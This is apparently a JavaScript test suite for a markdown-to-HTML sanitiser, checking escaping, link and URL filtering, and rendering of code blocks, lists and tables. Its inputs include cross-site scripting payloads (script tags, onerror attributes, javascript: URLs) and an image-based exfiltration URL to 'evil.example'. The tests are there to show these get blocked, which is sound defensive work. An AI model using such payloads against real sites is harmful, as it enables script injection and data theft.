import assert from 'node:assert/strict';
import test from 'node:test';

import { escapeHtml, renderMarkdown, sanitizeUrl, stripMarkdown } from '../src/lib/markdown.js';

test('HTML 을 이스케이프해서 태그가 살아나지 않는다', () => {
  const html = renderMarkdown('<script>alert(1)</script> & <b>bold</b>');
  assert.ok(!html.includes('<script'));
  assert.ok(!html.includes('<b>bold</b>'));
  assert.ok(html.includes('&lt;script&gt;'));
  assert.ok(html.includes('&amp;'));
});

test('이미지/링크 안에 들어온 스크립트 속성도 태그가 되지 않는다', () => {
  const html = renderMarkdown('![x](" onerror="alert(1)) 와 <img src=x onerror=alert(1)>');
  assert.ok(!html.includes('onerror="alert'));
  assert.ok(!/<img[^>]*onerror/i.test(html));
});

test('javascript: 와 data: 링크는 앵커로 바뀌지 않는다', () => {
  for (const bad of ['javascript:alert(1)', 'JavaScript:alert(1)', 'data:text/html,<b>']) {
    const html = renderMarkdown(`[클릭](${bad})`);
    assert.ok(!html.includes('<a '), `${bad} 가 링크로 변환됨: ${html}`);
  }
});

test('http/https/mailto 링크는 새 탭으로 열리도록 만든다', () => {
  const html = renderMarkdown('[구글](https://google.com) 과 [메일](mailto:a@b.com)');
  assert.match(html, /<a href="https:\/\/google\.com"[^>]*target="_blank"/);
  assert.match(html, /rel="noopener noreferrer nofollow"/);
  assert.ok(html.includes('href="mailto:a@b.com"'));
});

test('맨 URL 은 자동 링크가 되고 문장 부호는 링크에서 빠진다', () => {
  const html = renderMarkdown('참고: https://example.com/a?b=1&c=2 입니다.');
  assert.match(html, /<a href="https:\/\/example\.com\/a\?b=1&amp;c=2"/);
  const html2 = renderMarkdown('https://example.com/page.');
  assert.match(html2, /<a href="https:\/\/example\.com\/page"/);
  assert.ok(html2.endsWith('.</p>'));
});

test('앵커의 href 안에서 다시 자동 링크가 일어나지 않는다', () => {
  const html = renderMarkdown('[링크](https://example.com/x)');
  assert.equal((html.match(/<a /g) ?? []).length, 1);
});

test('코드 펜스는 언어 클래스와 함께 pre/code 로 감싼다', () => {
  const html = renderMarkdown('```python\nprint("hi")\n```');
  assert.ok(html.includes('<pre data-code="1">'));
  assert.ok(html.includes('class="language-python"'));
  assert.ok(html.includes('print(&quot;hi&quot;)'));
});

test('닫히지 않은 코드 펜스도 끝까지 코드로 처리한다', () => {
  const html = renderMarkdown('```\nunclosed code');
  assert.ok(html.includes('<code>unclosed code</code>'));
});

test('코드 블록 안의 마크다운 기호는 변환되지 않는다', () => {
  const html = renderMarkdown('```\n**bold** [l](https://a.com)\n```');
  assert.ok(!html.includes('<strong>'));
  assert.ok(!html.includes('<a '));
});

test('인라인 코드 안의 별표는 강조가 되지 않는다', () => {
  const html = renderMarkdown('`a * b * c` 그리고 **강조**');
  assert.ok(html.includes('<code>a * b * c</code>'));
  assert.ok(html.includes('<strong>강조</strong>'));
});

test('제목, 인용, 구분선을 만든다', () => {
  const html = renderMarkdown('## 제목\n\n> 인용문\n\n---\n');
  assert.ok(html.includes('<h2>제목</h2>'));
  assert.ok(html.includes('<blockquote>'));
  assert.ok(html.includes('<hr>'));
});

test('중첩 목록과 순서 있는 목록을 만든다', () => {
  const html = renderMarkdown('- a\n  - a1\n- b\n\n1. 하나\n2. 둘');
  assert.ok(html.includes('<ul>'));
  assert.ok(html.includes('<ol>'));
  assert.ok(/<li>a<ul><li>a1<\/li><\/ul><\/li>/.test(html), html);
});

test('체크박스 목록을 표시한다', () => {
  const html = renderMarkdown('- [x] 완료\n- [ ] 미완');
  assert.ok(html.includes('md-task is-done'));
  assert.ok(html.includes('☐'));
});

test('표를 정렬 정보와 함께 만든다', () => {
  const html = renderMarkdown('| 이름 | 값 |\n| :--- | ---: |\n| a | 1 |');
  assert.ok(html.includes('<table>'));
  assert.ok(html.includes('<th style="text-align:left">이름</th>'));
  assert.ok(html.includes('<td style="text-align:right">1</td>'));
});

test('표의 셀 수가 헤더보다 적어도 빈 칸으로 채운다', () => {
  const html = renderMarkdown('| a | b |\n| --- | --- |\n| 1 |');
  assert.equal((html.match(/<td/g) ?? []).length, 2);
});

test('입력에 들어온 제어문자는 제거된다', () => {
  const html = renderMarkdown('\u0000v0\u0000 정상 텍스트 `코드`');
  assert.ok(!html.includes('\u0000'));
  assert.ok(html.includes('<code>코드</code>'));
});

test('빈 입력과 null 을 안전하게 처리한다', () => {
  assert.equal(renderMarkdown(''), '');
  assert.equal(renderMarkdown(null), '');
  assert.equal(renderMarkdown(undefined), '');
});

test('escapeHtml 과 sanitizeUrl 의 기본 동작', () => {
  assert.equal(escapeHtml(`<a href="x">'&`), '&lt;a href=&quot;x&quot;&gt;&#39;&amp;');
  assert.equal(sanitizeUrl('https://a.com'), 'https://a.com');
  assert.equal(sanitizeUrl('  https://a.com  '), 'https://a.com');
  assert.equal(sanitizeUrl('javascript:alert(1)'), null);
  assert.equal(sanitizeUrl(''), null);
  assert.equal(sanitizeUrl(null), null);
});

test('stripMarkdown 은 평문만 남긴다', () => {
  assert.equal(stripMarkdown('## 제목\n\n**굵게** `코드` [링크](https://a.com)'), '제목 굵게 코드 링크');
});

test('아주 긴 입력도 합리적인 시간 안에 처리한다', () => {
  const long = '가나다라마바사 **강조** `코드` https://example.com/x\n\n'.repeat(2000);
  const started = Date.now();
  const html = renderMarkdown(long);
  assert.ok(html.length > 0);
  assert.ok(Date.now() - started < 4000, `렌더링이 너무 느립니다: ${Date.now() - started}ms`);
});


test('링크 title 안으로 들어온 내부 마커가 속성을 탈출하지 못한다 (회귀)', () => {
  const html = renderMarkdown('[x](https://a.com "![y](https://b.com)")');
  assert.equal((html.match(/<a /g) ?? []).length, 1, html);
  assert.ok(!html.includes('title="<'), html);
  assert.ok(!html.includes('<img'), html);
  assert.ok(!html.includes('\uE000'), html);
});

test('이미지는 자동 로드되는 <img> 가 아니라 링크로 렌더된다 (내용 반출 방지)', () => {
  const html = renderMarkdown('![유출](https://evil.example/leak?d=secret)');
  assert.ok(!html.includes('<img'), html);
  assert.match(html, /<a class="md-image" href="https:\/\/evil\.example\/leak\?d=secret"/);
  assert.ok(html.includes('유출'));
});

test('이미지의 javascript: URL 은 링크로도 만들지 않는다', () => {
  const html = renderMarkdown('![x](javascript:alert(1))');
  assert.ok(!html.includes('<a '), html);
});

test('소스에 실제 제어문자를 쓰지 않아도 마커가 동작한다', () => {
  const html = renderMarkdown('\uE000v0\uE000 정상 `코드`');
  assert.ok(!html.includes('\uE000'), html);
  assert.ok(html.includes('<code>코드</code>'));
});
